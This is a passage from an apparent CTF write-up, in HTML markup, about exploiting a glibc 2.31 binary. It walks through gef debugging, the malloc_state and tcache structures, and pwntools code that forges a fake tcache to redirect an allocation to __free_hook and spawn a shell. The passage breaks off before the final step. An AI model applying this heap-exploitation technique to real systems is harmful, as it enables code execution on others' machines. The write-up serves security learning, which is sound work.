+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Found</span> <span class=mi>0</span> <span class=n>chunks</span> <span class=n>in</span> <span class=n>unsorted</span> <span class=n>bin</span><span class=p>.</span>
+</span></span><span class=line><span class=cl> <span class=n>Small</span> <span class=n>Bins</span> <span class=k>for</span> <span class=n>arena</span> <span class=err>&#39;</span><span class=o>*</span><span class=mh>0x7f53d96a8b80</span><span class=err>&#39;</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Found</span> <span class=mi>0</span> <span class=n>chunks</span> <span class=n>in</span> <span class=mi>0</span> <span class=n>small</span> <span class=n>non</span><span class=o>-</span><span class=n>empty</span> <span class=n>bins</span><span class=p>.</span>
+</span></span><span class=line><span class=cl> <span class=n>Large</span> <span class=n>Bins</span> <span class=k>for</span> <span class=n>arena</span> <span class=err>&#39;</span><span class=o>*</span><span class=mh>0x7f53d96a8b80</span><span class=err>&#39;</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Found</span> <span class=mi>0</span> <span class=n>chunks</span> <span class=n>in</span> <span class=mi>0</span> <span class=n>large</span> <span class=n>non</span><span class=o>-</span><span class=n>empty</span> <span class=n>bins</span><span class=p>.</span>
+</span></span></code></pre></td></tr></table></div></div><p>Wait a minute. <code>arena 0x7f53d96a8b80</code>? That sounds a lot like a libc pointer.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span>  <span class=n>heap</span> <span class=n>arenas</span>
+</span></span><span class=line><span class=cl><span class=n>Arena</span> <span class=p>(</span><span class=n>base</span><span class=o>=</span><span class=mh>0x7f53d96a8b80</span><span class=p>,</span> <span class=n>top</span><span class=o>=</span><span class=mh>0x555556b195e0</span><span class=p>,</span> <span class=n>last_remainder</span><span class=o>=</span><span class=mh>0x0</span><span class=p>,</span> <span class=n>next</span><span class=o>=</span><span class=mh>0x7f53d96a8b80</span><span class=p>,</span> <span class=n>next_free</span><span class=o>=</span><span class=mh>0x0</span><span class=p>,</span> <span class=n>system_mem</span><span class=o>=</span><span class=mh>0x21000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span>  <span class=n>vmmap</span>
+</span></span><span class=line><span class=cl><span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f53d96a8000</span> <span class=mh>0x00007f53d96ab000</span> <span class=mh>0x00000000001ea000</span> <span class=n>rw</span><span class=o>-</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=p>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f53d96ab000</span> <span class=mh>0x00007f53d96b1000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span>
+</span></span><span class=line><span class=cl><span class=p>...</span>
+</span></span></code></pre></td></tr></table></div></div><p>And it is! In IDA Pro, this part of libc was labelled as the uninspiring <code>dword_1EBB80</code>, so this was definitely a lucky find.</p><p>With a bit of <a href=https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_state target=_blank rel="noopener noreffer">searching</a>, we can find the structure of the arena:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>malloc_state</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>__libc_lock_define</span> <span class=p>(,</span> <span class=n>mutex</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>flags</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>have_fastchunks</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>mfastbinptr</span> <span class=n>fastbinsY</span><span class=p>[</span><span class=n>NFASTBINS</span><span class=p>];</span> <span class=c1>// starts from 0x10 (?)
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>mchunkptr</span> <span class=n>top</span><span class=p>;</span>    <span class=c1>// This is +0x60
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>mchunkptr</span> <span class=n>last_remainder</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>mchunkptr</span> <span class=n>bins</span><span class=p>[</span><span class=n>NBINS</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>-</span> <span class=mi>2</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>binmap</span><span class=p>[</span><span class=n>BINMAPSIZE</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_state</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_state</span> <span class=o>*</span><span class=n>next_free</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>INTERNAL_SIZE_T</span> <span class=n>attached_threads</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>INTERNAL_SIZE_T</span> <span class=n>system_mem</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>INTERNAL_SIZE_T</span> <span class=n>max_system_mem</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Of particular note are the various <code>m.*ptr</code> variables, as well as the <code>next.*</code> pointers. Overwriting any of these could change the behaviour of the heap.</p><p>I started off by overwriting the <code>top</code> pointer, assessing what would happen if I replaced it with a pointer to garbage bytes</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#free_hook = 0x00000000001EEB28+context.libc.address</span>
+</span></span><span class=line><span class=cl><span class=n>arena</span> <span class=o>=</span> <span class=mh>0x1EBB80</span> <span class=o>+</span> <span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Input your message:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>500</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Where to write?:&#39;</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>arena</span> <span class=o>+</span> <span class=mh>0x60</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Any last message?:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>We get an interesting crash:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=n>DEBUG</span><span class=p>]</span> <span class=n>Received</span> <span class=mh>0x10</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s1>&#39;Where to write?:&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>DEBUG</span><span class=p>]</span> <span class=n>Sent</span> <span class=mh>0x8</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=mi>00000000</span>  <span class=n>e0</span> <span class=n>cb</span> <span class=mi>02</span> <span class=mi>12</span>  <span class=mi>02</span> <span class=mi>7</span><span class=n>f</span> <span class=mi>00</span> <span class=mi>00</span>                            <span class=err>│····│····│</span>
+</span></span><span class=line><span class=cl>    <span class=mi>00000008</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>DEBUG</span><span class=p>]</span> <span class=n>Received</span> <span class=mh>0x1d</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s1>&#39;malloc(): corrupted top size</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>Traceback</span> <span class=p>(</span><span class=n>most</span> <span class=n>recent</span> <span class=n>call</span> <span class=n>last</span><span class=p>):</span>
+</span></span></code></pre></td></tr></table></div></div><p>The top chunk, like all malloc&rsquo;d chunks, follows the following format:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>malloc_chunk</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>INTERNAL_SIZE_T</span>      <span class=n>mchunk_prev_size</span><span class=p>;</span>  <span class=cm>/* Size of previous chunk (if free).  */</span>
+</span></span><span class=line><span class=cl>  <span class=n>INTERNAL_SIZE_T</span>      <span class=n>mchunk_size</span><span class=p>;</span>       <span class=cm>/* Size in bytes, including overhead. */</span>
+</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span> <span class=o>*</span><span class=n>fd</span><span class=p>,</span> <span class=o>*</span><span class=n>bk</span><span class=p>;</span>         <span class=cm>/* double links -- used only if free. */</span>
+</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span> <span class=o>*</span><span class=n>fd_nextsize</span><span class=p>,</span> <span class=o>*</span><span class=n>bk_nextsize</span><span class=p>;</span> <span class=cm>/* double links -- used only if free. */</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>glibc <a href=https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L4106 target=_blank rel="noopener noreffer">detects</a> that the top chunk is a bit too large, and sends the program to abort:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=o>*</span><span class=nf>_int_malloc</span> <span class=p>(</span><span class=n>mstate</span> <span class=n>av</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>bytes</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=p>...</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>__glibc_unlikely</span> <span class=p>(</span><span class=n>size</span> <span class=o>&gt;</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=n>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;malloc(): corrupted top size&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>If we fix the mchunk_size to fit the glibc check&mldr; not much interesting happens. Nothing <em>will</em> ever happen, because the other bits of heap metadata aren&rsquo;t really all-too-important for allocating memory from the top chunk.</p><p>The allocation we want to manipulate — <code>malloc(0x30)</code> — can come from a number of different places, including the Fast Bins. I made a similar stab at editing <code>av->fastbinsY[2]</code>, but not much<sup>3</sup> came out of it. The rest of the pointers are even less useful. What to do?</p><h1 id=getting-arbitrary-libc-write>Getting arbitrary-libc-write</h1><p>With a few extra hours of digging, I realised something I should&rsquo;ve probably noticed a while back: the <code>tcache</code> variable.</p><p>Anyone familiar with the glibc heap will notice that there&rsquo;s an important bin missing from <code>malloc_state</code>. Considering that <code>malloc(0x30)</code> can only recycle from the Fast Bins and the Tcache, this was evidently worth investigating.</p><p>Over in <code>malloc.c/__libc_malloc</code>, the <code>tcache</code> variable appears to pop out of nowhere, undefined:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=nf>__libc_malloc</span> <span class=p>(</span><span class=n>size_t</span> <span class=n>bytes</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>mstate</span> <span class=n>ar_ptr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>victim</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=cp>#if USE_TCACHE
+</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=n>size_t</span> <span class=n>tbytes</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>checked_request2size</span> <span class=p>(</span><span class=n>bytes</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>tbytes</span><span class=p>))</span> <span class=cm>/* exit with error */</span>
+</span></span><span class=line><span class=cl>  <span class=n>size_t</span> <span class=n>tc_idx</span> <span class=o>=</span> <span class=n>csize2tidx</span> <span class=p>(</span><span class=n>tbytes</span><span class=p>);</span>  <span class=cm>/* == 2 for malloc(0x30) */</span>
+</span></span><span class=line><span class=cl>  <span class=n>MAYBE_INIT_TCACHE</span> <span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>tc_idx</span> <span class=o>&lt;</span> <span class=n>mp_</span><span class=p>.</span><span class=n>tcache_bins</span> <span class=o>&amp;&amp;</span> <span class=n>tcache</span> <span class=o>&amp;&amp;</span> <span class=n>tcache</span><span class=o>-&gt;</span><span class=n>counts</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>tcache_get</span> <span class=p>(</span><span class=n>tc_idx</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=cp>#endif
+</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>static</span> <span class=n>__always_inline</span> <span class=kt>void</span> <span class=o>*</span><span class=nf>tcache_get</span> <span class=p>(</span><span class=n>size_t</span> <span class=n>tc_idx</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>tcache_entry</span> <span class=o>*</span><span class=n>e</span> <span class=o>=</span> <span class=n>tcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=n>tcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>e</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=o>--</span><span class=p>(</span><span class=n>tcache</span><span class=o>-&gt;</span><span class=n>counts</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>  <span class=n>e</span><span class=o>-&gt;</span><span class=n>key</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>e</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>By ingeniously <em>clicking on the variable</em>, I realised that the <code>tcache</code> was another global pointer:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp># define TCACHE_MAX_BINS        64
+</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>typedef</span> <span class=k>struct</span> <span class=n>tcache_entry</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>tcache_entry</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>tcache_perthread_struct</span> <span class=o>*</span><span class=n>key</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>tcache_entry</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>tcache_perthread_struct</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>uint16_t</span> <span class=n>counts</span><span class=p>[</span><span class=n>TCACHE_MAX_BINS</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=n>tcache_entry</span> <span class=o>*</span><span class=n>entries</span><span class=p>[</span><span class=n>TCACHE_MAX_BINS</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>tcache_perthread_struct</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=cm>/* global variable here ! */</span>
+</span></span><span class=line><span class=cl><span class=k>static</span> <span class=n>__thread</span> <span class=n>tcache_perthread_struct</span> <span class=o>*</span><span class=n>tcache</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Thus, after about eight hours of digging, I had finally found an exploit path that looked simple enough for me to accomplish:</p><ol><li>Construct a fake <code>tcache_perthread_struct</code> that will pass the security checks, with <code>tcache->entries[2]</code> set to the location of <code>__free_hook</code> described a long time ago.</li><li>Fill in the first <code>main()</code> input with the fake tcache, and overwrite the global <code>tcache</code> pointer with the pointer to the user-controlled tcache</li><li>The new <code>malloc(0x30)</code>&rsquo;d memory will point to where <code>__free_hook</code> is. We can fill up that memory space with a one_gadget.</li><li>Allow <code>free()</code> to spawn a shell.</li></ol><p>All that&rsquo;s left is&mldr;</p><h2 id=implementation-hell>Implementation Hell</h2><p>It was simple enough to create the fake <code>tcache</code> in python:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>SIZE</span> <span class=o>=</span> <span class=mh>0x40</span> <span class=c1>#size of the second allocation</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tcache_perthread_struct</span><span class=p>(</span><span class=n>fake_ptrs</span><span class=p>:</span> <span class=nb>dict</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;fake_ptrs has (address: size) key-pairs&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>csize2tidx</span><span class=p>(</span><span class=n>x</span><span class=p>):</span> <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>//</span><span class=mi>16</span> <span class=o>-</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>TCACHE_MAX_BINS</span> <span class=o>=</span> <span class=mh>0x40</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>counts</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>TCACHE_MAX_BINS</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=n>entries</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>TCACHE_MAX_BINS</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>addr</span><span class=p>,</span><span class=n>size</span> <span class=ow>in</span> <span class=n>fake_ptrs</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=n>tidx</span> <span class=o>=</span> <span class=n>csize2tidx</span><span class=p>(</span><span class=n>size</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>counts</span><span class=p>[</span><span class=n>tidx</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>        <span class=n>entries</span><span class=p>[</span><span class=n>tidx</span><span class=p>]</span> <span class=o>=</span> <span class=n>addr</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=n>p16</span><span class=p>,</span><span class=n>counts</span><span class=p>))</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=n>p64</span><span class=p>,</span><span class=n>entries</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>fake_tcache</span> <span class=o>=</span> <span class=n>tcache_perthread_struct</span><span class=p>({</span><span class=n>free_hook</span><span class=p>:</span> <span class=n>SIZE</span><span class=p>})</span>
+</span></span></code></pre></td></tr></table></div></div><p>The issue arrives with figuring out precisely <em>where</em> the tcache pointer is. IDA Pro was not<sup>4</sup> very helpful.</p><p>Eventually, I figured out from <a href=https://github.com/pwndbg/pwndbg/blob/dev/pwndbg/heap/ptmalloc.py#L138-L143 target=_blank rel="noopener noreffer">online sources</a> that the tcache (the real tcache in memory; not the pointer to the tcache) is always located at <code>heap_address+0x10</code>. From there, I used <code>gdb</code> to search for pointers to that space in memory:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span>  <span class=n>vmmap</span> <span class=n>heap</span>
+</span></span><span class=line><span class=cl><span class=p>[</span> <span class=n>Legend</span><span class=p>:</span>  <span class=n>Code</span> <span class=o>|</span> <span class=n>Heap</span> <span class=o>|</span> <span class=n>Stack</span> <span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>Start</span>              <span class=n>End</span>                <span class=n>Offset</span>             <span class=n>Perm</span> <span class=n>Path</span>
+</span></span><span class=line><span class=cl><span class=mh>0x0000555557527000</span> <span class=mh>0x0000555557548000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span> <span class=p>[</span><span class=n>heap</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span>  <span class=n>grep</span> <span class=mh>0x0000555557527010</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Searching</span> <span class=s1>&#39;</span><span class=se>\x10\x70\x52\x57\x55\x55\x00\x00</span><span class=s1>&#39;</span> <span class=ow>in</span> <span class=n>memory</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>In</span> <span class=s1>&#39;[heap]&#39;</span><span class=p>(</span><span class=mh>0x555557527000</span><span class=o>-</span><span class=mh>0x555557548000</span><span class=p>),</span> <span class=n>permission</span><span class=o>=</span><span class=n>rw</span><span class=o>-</span>
+</span></span><span class=line><span class=cl>  <span class=mh>0x5555575275b8</span> <span class=o>-</span> <span class=mh>0x5555575275d8</span>  <span class=err>→</span>   <span class=s2>&#34;</span><span class=se>\x10\x70\x52\x57\x55\x55\x00\x00</span><span class=s2>[...]&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>In</span> <span class=p>(</span><span class=mh>0x7facf8661000</span><span class=o>-</span><span class=mh>0x7facf8667000</span><span class=p>),</span> <span class=n>permission</span><span class=o>=</span><span class=n>rw</span><span class=o>-</span>
+</span></span><span class=line><span class=cl>  <span class=mh>0x7facf8666530</span> <span class=o>-</span> <span class=mh>0x7facf8666550</span>  <span class=err>→</span>   <span class=s2>&#34;</span><span class=se>\x10\x70\x52\x57\x55\x55\x00\x00</span><span class=s2>[...]&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span>  <span class=n>vmmap</span> <span class=n>libc</span>
+</span></span><span class=line><span class=cl><span class=p>[</span> <span class=n>Legend</span><span class=p>:</span>  <span class=n>Code</span> <span class=o>|</span> <span class=n>Heap</span> <span class=o>|</span> <span class=n>Stack</span> <span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>Start</span>              <span class=n>End</span>                <span class=n>Offset</span>             <span class=n>Perm</span> <span class=n>Path</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007facf8473000</span> <span class=mh>0x00007facf8498000</span> <span class=mh>0x0000000000000000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>a</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=n>database</span><span class=o>/</span><span class=n>libs</span><span class=o>/</span><span class=n>libc6_2</span><span class=mf>.31</span><span class=o>-</span><span class=mi>0</span><span class=n>ubuntu9_amd64</span><span class=o>/</span><span class=n>libc</span><span class=o>.</span><span class=n>so</span><span class=mf>.6</span>
+</span></span></code></pre></td></tr></table></div></div><p>There&rsquo;s only one pointer (<code>0x7facf8666530</code>) from the libc region, so we&rsquo;ll take that to be the tcache pointer.</p><p>All that&rsquo;s left to do is to grab a one_gadget and run with it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
